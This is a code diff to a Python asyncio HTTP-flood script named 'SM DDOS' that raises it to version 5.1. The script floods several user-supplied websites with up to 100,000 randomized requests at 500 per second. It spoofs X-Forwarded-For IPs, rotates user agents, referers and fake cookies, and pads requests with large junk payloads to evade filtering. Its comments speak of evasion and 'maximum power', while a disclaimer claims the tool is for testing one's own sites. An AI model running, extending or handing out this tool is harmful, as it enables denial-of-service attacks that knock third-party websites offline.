@@ -6,8 +6,8 @@
 # It sends massive, varied HTTP requests to multiple websites, meant for authorized use only.
 # Unauthorized use is prohibited and illegal.
 #
-# Author: Optimized for Termux/VPS and GitHub, version 5.0
-# Updates: Multi-website support, extreme concurrency, massive payloads, advanced evasion.
+# Author: Sifat Mahmud (SM), version 5.1
+# Updates: Multi-website support, ultra-high concurrency, massive payloads, gorgeous UI.
 # ----------------------------------------------------------------------------------------------
 
 import aiohttp
@@ -20,19 +20,25 @@ from urllib.parse import urlparse
 from statistics import mean
 import psutil
 import os
+try:
+    from termcolor import colored
+except ImportError:
+    os.system("pip install termcolor")
+    from termcolor import colored
+import ssl
 
 # Configuration
 CONFIG = {
-    'max_requests': 50000,     # Total requests (massive)
-    'timeout': 600,            # Test duration (seconds)
-    'batch_size': 500,         # Simultaneous requests
-    'request_rate': 300,       # Requests per second
-    'max_retries': 5,          # Retry attempts
+    'max_requests': 100000,    # Total requests (extreme)
+    'timeout': 900,            # Test duration (seconds)
+    'batch_size': 1000,        # Simultaneous requests
+    'request_rate': 500,       # Requests per second
+    'max_retries': 6,          # Retry attempts
     'request_types': ['GET', 'POST', 'HEAD', 'PUT'],
     'log_file': 'ddos_test.log',
     'target_urls': [],         # Filled dynamically
-    'payload_size': 10240,     # Max POST payload (10KB)
-    'connection_limit': 2000   # Max simultaneous connections
+    'payload_size': 20480,     # Max payload (20KB)
+    'connection_limit': 5000   # Max connections
 }
 
 # Configure logging
@@ -71,7 +77,8 @@ def useragent_list():
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
         'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'
+        'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
     ]
     return headers_useragents
 
@@ -88,7 +95,9 @@ def referer_list():
         'https://www.reddit.com/',
         'https://www.linkedin.com/',
         'https://www.instagram.com/',
-        'https://www.youtube.com/'
+        'https://www.youtube.com/',
+        'https://www.pinterest.com/',
+        'https://www.tiktok.com/'
     ]
     return headers_referers
 
@@ -103,10 +112,10 @@ def check_resources():
         memory = psutil.virtual_memory()
         if cpu_usage > 95:
             logger.warning(f"High CPU usage: {cpu_usage}% - Reducing batch size")
-            CONFIG['batch_size'] = max(100, CONFIG['batch_size'] // 2)
+            CONFIG['batch_size'] = max(200, CONFIG['batch_size'] // 2)
         if memory.percent > 95:
             logger.warning(f"High memory usage: {memory.percent}% - Reducing batch size")
-            CONFIG['batch_size'] = max(100, CONFIG['batch_size'] // 2)
+            CONFIG['batch_size'] = max(200, CONFIG['batch_size'] // 2)
         return cpu_usage < 95 and memory.percent < 95
     except Exception as e:
         logger.error(f"Resource check failed: {e}")
@@ -116,7 +125,7 @@ async def httpcall(session, target_url, retry=0):
     """Send a varied HTTP request with randomized headers and payloads."""
     global request_counter, successful_requests, failed_requests, response_times, status_codes
     param_joiner = "&" if "?" in target_url else "?"
-    target_url = f"{target_url}{param_joiner}{buildblock(random.randint(5, 20))}={buildblock(random.randint(5, 20))}"
+    target_url = f"{target_url}{param_joiner}{buildblock(random.randint(5, 25))}={buildblock(random.randint(5, 25))}"
     headers = {
         'User-Agent': random.choice(headers_useragents),
         'Accept': random.choice([
@@ -127,30 +136,33 @@ async def httpcall(session, target_url, retry=0):
         'Accept-Language': random.choice(['en-US,en;q=0.5', 'en-GB,en;q=0.5', 'fr-FR,fr;q=0.5', 'de-DE,de;q=0.5', 'es-ES,es;q=0.5']),
         'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip', 'deflate', 'br', 'identity']),
         'Cache-Control': random.choice(['no-cache', 'max-age=0']),
-        'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 15)),
+        'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 20)),
         'Connection': 'keep-alive',
         'Host': urlparse(target_url).netloc,
-        'Cookie': f'session={buildblock(20)}; user={buildblock(15)}; id={buildblock(10)}',
+        'Cookie': f'session={buildblock(20)}; user={buildblock(15)}; id={buildblock(10)}; token={buildblock(25)}',
         'X-Forwarded-For': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
         'DNT': random.choice(['1', '0']),
-        'Upgrade-Insecure-Requests': '1'
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': random.choice(['document', 'image', 'script']),
+        'Sec-Fetch-Mode': random.choice(['navigate', 'same-origin', 'no-cors']),
+        'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site'])
     }
     request_type = random.choice(CONFIG['request_types'])
     start_time = time.time()
     try:
         if request_type == 'POST':
-            data = {'data': buildblock(random.randint(2000, CONFIG['payload_size']))}
-            async with session.post(target_url, headers=headers, data=data, timeout=30, ssl=False) as response:
+            data = {'data': buildblock(random.randint(5000, CONFIG['payload_size']))}
+            async with session.post(target_url, headers=headers, data=data, timeout=40, ssl=ssl.SSLContext()) as response:
                 status = response.status
         elif request_type == 'PUT':
-            data = {'data': buildblock(random.randint(2000, CONFIG['payload_size']))}
-            async with session.put(target_url, headers=headers, data=data, timeout=30, ssl=False) as response:
+            data = {'data': buildblock(random.randint(5000, CONFIG['payload_size']))}
+            async with session.put(target_url, headers=headers, data=data, timeout=40, ssl=ssl.SSLContext()) as response:
                 status = response.status
         elif request_type == 'HEAD':
-            async with session.head(target_url, headers=headers, timeout=30, ssl=False) as response:
+            async with session.head(target_url, headers=headers, timeout=40, ssl=ssl.SSLContext()) as response:
                 status = response.status
         else:  # GET
-            async with session.get(target_url, headers=headers, timeout=30, ssl=False) as response:
+            async with session.get(target_url, headers=headers, timeout=40, ssl=ssl.SSLContext()) as response:
                 status = response.status
         response_time = time.time() - start_time
         response_times.append(response_time)
@@ -171,7 +183,7 @@ async def httpcall(session, target_url, retry=0):
         request_counter += 1
         if retry < CONFIG['max_retries']:
             logger.debug(f"Retrying request {request_counter} (Attempt {retry + 1}/{CONFIG['max_retries']})")
-            await asyncio.sleep(random.uniform(0.01, 0.1))  # Random delay for evasion
+            await asyncio.sleep(random.uniform(0.01, 0.2))
             return await httpcall(session, target_url, retry + 1)
         logger.error(f"Request {request_counter} failed after {CONFIG['max_retries']} retries")
         return None
@@ -182,6 +194,11 @@ async def run_attack():
     useragent_list()
     referer_list()
     start_time = time.time()
+    print(colored("🚀 Initializing attack...", "cyan"), end="")
+    for _ in range(3):
+        time.sleep(0.5)
+        print(colored(".", "cyan"), end="", flush=True)
+    print(colored(" Launched!", "green"))
     
     connector = aiohttp.TCPConnector(limit=CONFIG['connection_limit'], ttl_dns_cache=300, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
@@ -197,6 +214,7 @@ async def run_attack():
             if tasks:
                 await asyncio.gather(*tasks, return_exceptions=True)
                 logger.info(f"Sent {request_counter} requests (Success: {successful_requests}, Failed: {failed_requests})")
+                print(colored(f"🔥 Sent {request_counter} requests (Success: {successful_requests}, Failed: {failed_requests})", "yellow"))
             # No sleep for maximum power
     duration = time.time() - start_time
     success_rate = (successful_requests / request_counter * 100) if request_counter > 0 else 0
@@ -205,52 +223,59 @@ async def run_attack():
     logger.info(f"Success rate: {success_rate:.2f}% (Successful: {successful_requests}, Failed: {failed_requests})")
     logger.info(f"Average response time: {avg_response_time:.3f} seconds")
     logger.info(f"Status codes: {dict(status_codes)}")
+    print(colored(f"\n🏁 Attack finished: {request_counter} requests in {duration:.2f}s", "green"))
+    print(colored(f"Success rate: {success_rate:.2f}% (Success: {successful_requests}, Failed: {failed_requests})", "green"))
+    print(colored(f"Avg response time: {avg_response_time:.3f}s", "green"))
+    print(colored(f"Status codes: {dict(status_codes)}", "green"))
 
 def welcome_message():
-    """Display a welcome message."""
-    print("""
+    """Display a gorgeous welcome message."""
+    print(colored("""
     ╔════════════════════════════════════════════════════╗
     ║       SM DDOS - Ultra-Powerful Stress Testing      ║
     ║                                                    ║
-    ║ For ETHICAL testing of YOUR OWN websites only!      ║
-    ║ Unauthorized use is ILLEGAL and prohibited.         ║
-    ║ Version 5.0 - Optimized for Termux/VPS             ║
-    ║ Date: August 16, 2025                              ║
+    ║   Author: Sifat Mahmud (SM)                        ║
+    ║   For ETHICAL testing of YOUR OWN websites only!    ║
+    ║   Unauthorized use is ILLEGAL and prohibited.       ║
+    ║   Version 5.1 - Optimized for Termux/VPS           ║
+    ║   Date: August 16, 2025                            ║
     ╚════════════════════════════════════════════════════╝
-    """)
+    """, "cyan"))
 
 def get_user_input():
-    """Prompt for multiple URLs, request count, and rate."""
+    """Prompt for multiple URLs, request count, and rate with colorized UI."""
     global CONFIG
-    print("Enter target URLs (one per line, press Enter twice to finish):")
+    print(colored("🌐 Enter target URLs (one per line, press Enter twice to finish):", "magenta"))
     urls = []
     while True:
-        url = input("URL (e.g., https://sm5test.rf.gd/SM/sm-bomber.html): ").strip()
+        url = input(colored("URL (e.g., https://sm5test.rf.gd/SM/sm-bomber.html): ", "blue")).strip()
         if not url:
             if urls:
                 break
             else:
-                print("At least one URL is required!")
+                print(colored("❌ At least one URL is required!", "red"))
                 continue
         if not url.startswith(('http://', 'https://')):
             url = f'https://{url}'
         urls.append(url)
     
     try:
-        max_requests = input("Enter total number of requests (default 50000): ").strip()
-        CONFIG['max_requests'] = int(max_requests) if max_requests else 50000
-        request_rate = input("Enter requests per second (default 300): ").strip()
-        CONFIG['request_rate'] = int(request_rate) if request_rate else 300
+        max_requests = input(colored("🔢 Enter total number of requests (default 100000): ", "blue")).strip()
+        CONFIG['max_requests'] = int(max_requests) if max_requests else 100000
+        request_rate = input(colored("⚡ Enter requests per second (default 500): ", "blue")).strip()
+        CONFIG['request_rate'] = int(request_rate) if request_rate else 500
     except ValueError:
         logger.error("Invalid input for max_requests or request_rate. Using defaults.")
-        CONFIG['max_requests'] = 50000
-        CONFIG['request_rate'] = 300
+        print(colored("⚠ Invalid input. Using defaults: 100000 requests, 500 req/s.", "yellow"))
+        CONFIG['max_requests'] = 100000
+        CONFIG['request_rate'] = 500
     
     # Generate endpoints for each URL
     for url in urls:
         parsed_url = urlparse(url)
         if not parsed_url.netloc:
             logger.error(f"Invalid URL: {url}")
+            print(colored(f"❌ Invalid URL: {url}", "red"))
             continue
         host = parsed_url.netloc
         base_urls = [
@@ -273,7 +298,17 @@ def get_user_input():
             f'https://{host}/auth/',
             f'https://{host}/config/',
             f'https://{host}/data/',
-            f'https://{host}/status.html'
+            f'https://{host}/status.html',
+            f'https://{host}/user/',
+            f'https://{host}/shop.html',
+            f'https://{host}/cart.html',
+            f'https://{host}/checkout.html',
+            f'https://{host}/faq.html',
+            f'https://{host}/terms.html',
+            f'https://{host}/privacy.html',
+            f'https://{host}/news/',
+            f'https://{host}/events/',
+            f'https://{host}/support.html'
         ]
         if url not in base_urls:
             base_urls.append(url)
@@ -287,23 +322,29 @@ def main():
     urls = get_user_input()
     if not CONFIG['target_urls']:
         logger.error("No valid URLs provided. Exiting.")
+        print(colored("❌ No valid URLs provided. Exiting.", "red"))
         sys.exit(1)
     
     global hosts
     hosts = list(set(urlparse(url).netloc for url in CONFIG['target_urls']))
     logger.info(f"Starting SM DDOS attack on {len(hosts)} hosts with {len(CONFIG['target_urls'])} endpoints")
+    print(colored(f"🎯 Targeting {len(hosts)} hosts with {len(CONFIG['target_urls'])} endpoints", "green"))
     try:
         asyncio.run(run_attack())
     except KeyboardInterrupt:
         logger.info("Attack stopped by user")
+        print(colored("🛑 Attack stopped by user", "red"))
     except Exception as e:
         logger.error(f"Attack failed: {e}")
+        print(colored(f"❌ Attack failed: {e}", "red"))
 
 if __name__ == '__main__':
     try:
         import psutil
+        import termcolor
     except ImportError:
-        print("Installing psutil for resource monitoring...")
-        os.system("pip install psutil")
+        print(colored("📦 Installing required libraries (psutil, termcolor)...", "yellow"))
+        os.system("pip install psutil termcolor")
         import psutil
+        import termcolor
     main()
